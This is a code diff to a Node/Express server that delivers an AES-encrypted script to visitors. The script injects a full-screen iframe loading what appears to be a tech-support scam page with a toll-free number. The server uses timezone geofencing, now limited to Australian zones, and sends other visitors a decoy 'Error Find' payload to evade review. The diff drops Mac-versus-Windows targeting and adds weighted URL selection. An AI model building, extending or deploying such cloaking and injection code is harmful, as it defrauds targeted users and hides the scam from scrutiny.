@@ -23,22 +23,20 @@ app.use((req, res, next) => {
 });
 
 // --- Static Data Configurations ---
+
+// O(1) Instant Lookup Set
 const ALLOWED_TIMEZONES = new Set([
-    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin", "Asia/Tokyo",
-        "America/New_York", "America/Chicago", "America/Denver", "America/Los_Angeles", "America/Anchorage",
-        "Pacific/Honolulu",
-        "America/Toronto", "America/Vancouver", "America/Edmonton", "America/Winnipeg", "America/Halifax", "America/St_Johns"
+    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin"
 ]);
-const MAC_USER_AGENT_PATTERN = /Macintosh|Mac OS|macOS/;
 
-
-const MAC_URL = "https://leekoooyy1.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
-const DEFAULT_URL = "https://leekoooyy1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369";
+// Raw URLs accompanied by their selection probability weights (Must total 1.0)
+const RAW_CONFIGS = [
+    { url: "https://leekoooyy1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369", weight: 1.0 }
+    
+];
 
 // --- Pre-Compilation Cache Layer ---
-const PRECOMPUTED_RESPONSES = [
-    { url: DEFAULT_URL, weight: 1.0 }
-];
+// This processes everything into memory ONCE during boot, removing CPU load during requests.
 
 const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
     const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
@@ -53,6 +51,11 @@ const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
 const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
 
 // --- Helper Functions ---
+
+/**
+ * Returns a pre-encrypted payload immediately using constant-time evaluation 
+ * and simple random boundary checks.
+ */
 function getFastResponse() {
     const rand = Math.random();
     let cumulativeWeight = 0;
@@ -67,6 +70,7 @@ function getFastResponse() {
 }
 
 // --- Routes ---
+
 app.get("/timezone", (req, res) => {
     res.status(401).json({
         status: "error",
@@ -77,16 +81,10 @@ app.get("/timezone", (req, res) => {
 
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
-    const userAgent = req.headers['user-agent'] || '';
 
-    // Fast validations against memory references
+    // Fast validations against memory references 
     if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
-        const selectedUrl = MAC_USER_AGENT_PATTERN.test(userAgent) ? MAC_URL : DEFAULT_URL;
-        const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${selectedUrl}";...`;
-        
-        // Encrypt and return response as before
-        const encryptedPayload = encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString());
-        res.send(encryptedPayload);
+        res.send(getFastResponse());
     } else {
         res.send(ERROR_PAYLOAD);
     }
